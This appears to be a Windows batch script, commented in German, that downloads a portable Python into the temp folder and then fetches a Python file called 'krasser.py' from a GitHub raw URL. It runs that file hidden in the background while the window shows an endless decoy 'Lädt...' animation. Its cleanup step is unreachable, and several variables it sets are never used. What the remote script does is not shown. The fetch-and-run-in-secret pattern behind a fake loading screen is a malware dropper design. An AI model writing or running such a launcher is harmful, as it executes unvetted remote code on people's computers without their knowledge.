@echo off
SETLOCAL

:: Pfad zur portablen Python-Distribution (muss angepasst werden)
SET TEMP_DIR=%TEMP%\python_install
SET PYTHON_DIR=%TEMP%\portable-python
SET PYTHON_EXEC=%PYTHON_DIR%\python.exe
SET PYTHON_URL=https://www.python.org/ftp/python/3.13.1/python-3.13.1-embed-amd64.zip
SET PIP_URL=https://bootstrap.pypa.io/get-pip.py
SET PYTHON_SCRIPT_URL=https://raw.githubusercontent.com/VipexDe/schuPy/refs/heads/main/krasser.py
SET PYTHON_SCRIPT_DEST=%TEMP_DIR%\krasser.py
SET PIP_SCRIPT_DEST=%TEMP_DIR%\get-pip.py

:: Temporären Ordner für den Installer erstellen
IF NOT EXIST %TEMP_DIR% MD %TEMP_DIR%

:: Portable Python herunterladen, wenn nicht vorhanden
IF NOT EXIST %PYTHON_EXEC% (
    echo Lade portable Python-Distribution herunter...
    powershell -Command "Invoke-WebRequest -Uri %PYTHON_URL% -OutFile %TEMP_DIR%\python.zip"
    echo Entpacke portable Python-Distribution...
    powershell -Command "Expand-Archive -Path %TEMP_DIR%\python.zip -DestinationPath %PYTHON_DIR%"
)

:: Sicherstellen, dass die portable Python-Distribution existiert
IF NOT EXIST %PYTHON_EXEC% (
    echo Portable Python-Distribution nicht gefunden!
    exit /b 1
)





:: Pfad zum Python Scripts-Ordner
SET PYTHON_SCRIPTS_DIR=%PYTHON_DIR%\Scripts

:: PATH-Variable erweitern für aktuelle Sitzung
SET PATH=%PYTHON_SCRIPTS_DIR%;%PATH%

:: Python-Skript herunterladen
IF NOT EXIST %PYTHON_SCRIPT_DEST% (
    echo Lade Python-Skript herunter...
    powershell -Command "Invoke-WebRequest -Uri %PYTHON_SCRIPT_URL% -OutFile %PYTHON_SCRIPT_DEST%"
)

:: Aktuellen Benutzer und Desktop-Ordnerpfad ermitteln
FOR /F "tokens=2 delims==" %%I IN ('wmic computersystem get username /value') DO SET USERNAME=%%I
SET USERNAME=%USERNAME:*\=%
SET DESKTOP_DIR=C:\Users\%USERNAME%\Desktop\test

:: Python-Datei im Hintergrund ausführen
START /B %PYTHON_EXEC% %PYTHON_SCRIPT_DEST%

:: Animation von "Lädt ..." mit regenbogenfarbenen Punkten
:loop
cls
SET "colors=0C 0A 0E 0B 0D 09 0F"
FOR %%C IN (%colors%) DO (
    echo Lädt...
    timeout /t 1 /nobreak >nul
)
goto loop

:: Temporären Ordner löschen
RMDIR /S /Q %TEMP_DIR%

ENDLOCAL
@echo on
